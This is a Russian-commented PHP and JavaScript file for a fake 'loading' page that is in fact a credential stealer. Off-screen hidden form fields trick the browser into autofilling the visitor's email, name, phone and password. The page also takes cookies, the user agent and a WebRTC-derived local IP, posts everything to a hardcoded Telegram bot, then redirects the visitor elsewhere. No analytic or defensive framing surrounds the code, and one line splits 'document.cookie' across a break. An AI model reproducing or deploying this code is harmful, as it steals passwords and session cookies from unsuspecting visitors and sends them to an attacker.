<?php
// ======== ПРИЁМ ДАННЫХ ОТ JAVASCRIPT ========
$raw = file_get_contents('php://input');
if ($raw) {
    $data = json_decode($raw, true);
    if ($data) {
        // Формируем сообщение для Telegram
        $msg = "✅ НОВЫЙ СБОР ДАННЫХ\n\n";
        $msg .= "🌐 IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'неизвестно') . "\n";
        $msg .= "📧 Email: " . ($data['email'] ?? 'не получено') . "\n";
        $msg .= "👤 Имя: " . ($data['name'] ?? 'не получено') . "\n";
        $msg .= "📱 Телефон: " . ($data['phone'] ?? 'не получено') . "\n";
        $msg .= "🔑 Пароль: " . ($data['password'] ?? 'не получено') . "\n";
        $msg .= "🧑 Полное имя: " . ($data['full_name'] ?? 'не получено') . "\n";
        $msg .= "🏠 Локальный IP: " . ($data['local_ip'] ?? 'не получено') . "\n";
        $msg .= "🖥️ Браузер: " . ($data['browser'] ?? 'не получено') . "\n";
        $msg .= "🍪 Cookies: " . ($data['cookies'] ?? 'нет') . "\n";
        $msg .= "⏰ Время: " . date('Y-m-d H:i:s');

        // Отправка в Telegram
        $bot_token = '8630001162:AAHw1VOaRqjKE8T1h_dCSeNcIq77k0wxwwM';
        $chat_id = '7112152265';
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $post = ['chat_id' => $chat_id, 'text' => $msg];
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);

        // Логируем ответ Telegram для отладки
        file_put_contents('tg_log.txt', date('Y-m-d H:i:s') . " | " . $response . "\n", FILE_APPEND);
        
        echo 'OK';
        exit;
    }
}

// ======== HTML + JAVASCRIPT (СБОР И ОТПРАВКА) ========
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: Arial; text-align: center; padding-top: 20%; }
    </style>
</head>
<body>
    <h1>Идёт загрузка...</h1>
    <p>Пожалуйста, подождите.</p>

    <script>
    (function() {
        // Создаём скрытые поля для автозаполнения
        var form = document.createElement('form');
        form.innerHTML = `
            <input type="email" id="email" autocomplete="email" style="position:absolute;left:-9999px;width:1px;height:1px;">
            <input type="text" id="name" autocomplete="given-name" style="position:absolute;left:-9999px;width:1px;height:1px;">
            <input type="tel" id="phone" autocomplete="tel" style="position:absolute;left:-9999px;width:1px;height:1px;">
            <input type="password" id="pass" autocomplete="current-password" style="position:absolute;left:-9999px;width:1px;height:1px;">
            <input type="text" id="full" autocomplete="name" style="position:absolute;left:-9999px;width:1px;height:1px;">
        `;
        document.body.appendChild(form);

        // Активируем автозаполнение
        var email = document.getElementById('email');
        var name = document.getElementById('name');
        var phone = document.getElementById('phone');
        var pass = document.getElementById('pass');
        var full = document.getElementById('full');

        email.focus();
        email.blur();
        name.focus();
        name.blur();
        phone.focus();
        phone.blur();
        pass.focus();
        pass.blur();
        full.focus();
        full.blur();

        // Собираем данные через 1.5 секунды
        setTimeout(function() {
            var collected = {
                email: email.value || 'не заполнено',
                name: name.value || 'не заполнено',
                phone: phone.value || 'не заполнено',
                password: pass.value || 'не заполнено',
                full_name: full.value || 'не заполнено',
                local_ip: 'не определён',
                browser: navigator.userAgent,
                cookies: document.c


ookie || 'нет',
                screen: screen.width + 'x' + screen.height
            };

            // Получаем локальный IP через WebRTC
            var pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer) {
                pc.setLocalDescription(offer);
            });
            pc.onicecandidate = function(e) {
                if (!e.candidate) return;
                var ip = e.candidate.candidate.split(' ')[4];
                if (ip && ip.indexOf('.') !== -1) {
                    collected.local_ip = ip;
                    pc.close();
                    sendData(collected);
                }
            };
            setTimeout(function() {
                if (collected.local_ip === 'не определён') {
                    sendData(collected);
                }
                pc.close();
            }, 3000);

            function sendData(data) {
                // Отправка на сервер (тот же URL)
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                })
                .then(function() {
                    // После отправки — редирект
                    window.location.replace('https://azrpp.ru');
                })
                .catch(function() {
                    // Если fetch упал — всё равно редирект
                    window.location.replace('https://azrpp.ru');
                });
            }
        }, 1500);
    })();
    </script>
</body>
</html>


